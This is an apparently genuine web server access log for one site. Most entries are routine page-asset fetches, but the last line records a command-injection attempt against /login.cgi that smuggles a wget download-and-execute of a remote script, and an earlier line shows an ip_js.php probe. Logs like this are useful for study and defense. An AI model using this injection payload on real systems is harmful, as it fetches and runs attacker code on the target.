66.102.9.19 - - [18/Jun/2018:08:04:27 +0000] "GET /css/main.min.css HTTP/1.1" 200 43837 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.25 - - [18/Jun/2018:08:04:27 +0000] "GET /img/icon3.jpg HTTP/1.1" 200 43327 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.19 - - [18/Jun/2018:08:04:27 +0000] "GET /img/icon2.jpg HTTP/1.1" 200 54937 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.25 - - [18/Jun/2018:08:04:27 +0000] "GET /js/main.min.js HTTP/1.1" 200 78430 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.23 - - [18/Jun/2018:08:04:27 +0000] "GET /img/img3.png HTTP/1.1" 200 963 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.25 - - [18/Jun/2018:08:04:27 +0000] "GET /img/right.png HTTP/1.1" 200 84151 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.19 - - [18/Jun/2018:08:04:27 +0000] "GET /img/top.png HTTP/1.1" 200 49365 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.25 - - [18/Jun/2018:08:04:27 +0000] "GET /img/big.png HTTP/1.1" 200 407229 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.25 - - [18/Jun/2018:08:04:27 +0000] "GET /img/left.png HTTP/1.1" 200 44654 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.25 - - [18/Jun/2018:08:04:27 +0000] "GET /fonts/bebas/BebasNeueBook.woff2 HTTP/1.1" 200 12992 "http://docker.consultingpro.com.ua/css/main.min.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.25 - - [18/Jun/2018:08:04:27 +0000] "GET /fonts/bebas/BebasNeueBold.woff2 HTTP/1.1" 200 12392 "http://docker.consultingpro.com.ua/css/main.min.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.25 - - [18/Jun/2018:08:04:27 +0000] "GET /fonts/GothamPro/GothamPro-Light.woff2 HTTP/1.1" 200 14504 "http://docker.consultingpro.com.ua/css/main.min.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.19 - - [18/Jun/2018:08:04:27 +0000] "GET /img/bg-t.jpg HTTP/1.1" 200 20017 "http://docker.consultingpro.com.ua/css/main.min.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.25 - - [18/Jun/2018:08:04:27 +0000] "GET /img/rocket.png HTTP/1.1" 200 5635 "http://docker.consultingpro.com.ua/css/main.min.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.23 - - [18/Jun/2018:08:04:27 +0000] "GET /img/mask.jpg HTTP/1.1" 200 42002 "http://docker.consultingpro.com.ua/css/main.min.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.23 - - [18/Jun/2018:08:04:27 +0000] "GET /img/btn-bg.png HTTP/1.1" 200 739 "http://docker.consultingpro.com.ua/css/main.min.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.19 - - [18/Jun/2018:08:04:28 +0000] "GET /fonts/GothamPro/GothamPro-Bold.woff2 HTTP/1.1" 200 14768 "http://docker.consultingpro.com.ua/css/main.min.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.23 - - [18/Jun/2018:08:04:28 +0000] "GET /img/bg-f.jpg HTTP/1.1" 200 183709 "http://docker.consultingpro.com.ua/css/main.min.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
14.176.176.27 - - [18/Jun/2018:08:04:31 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
89.252.57.183 - - [18/Jun/2018:08:18:00 +0000] "GET / HTTP/1.1" 200 2333 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
91.46.150.219 - - [18/Jun/2018:08:19:29 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
61.176.222.170 - - [18/Jun/2018:08:24:40 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
177.136.231.230 - - [18/Jun/2018:08:34:55 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ HTTP/1.1" 404 152 "-" "Hello, World"
